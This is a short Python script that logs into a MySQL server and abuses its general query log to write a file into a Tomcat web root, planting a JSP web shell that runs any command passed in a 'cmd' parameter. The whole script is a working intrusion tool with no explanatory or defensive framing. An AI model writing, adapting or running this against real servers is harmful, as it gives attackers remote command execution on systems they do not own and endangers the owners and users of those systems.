import pymysql
import sys

connection = pymysql.connect(host=sys.argv[1], user=sys.argv[2], password=sys.argv[3], autocommit=True)
with connection.cursor() as cursor:
    cursor.execute("SET GLOBAL general_log = 'OFF'")
    cursor.execute("SET GLOBAL general_log_file = '/var/lib/tomcat/webapps/ROOT/cl1217.jsp'")
    cursor.execute("SET GLOBAL general_log = 'ON'")
    cursor.execute('SELECT \'<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>\'')
    cursor.execute("SET GLOBAL general_log = 'OFF'")
connection.close()
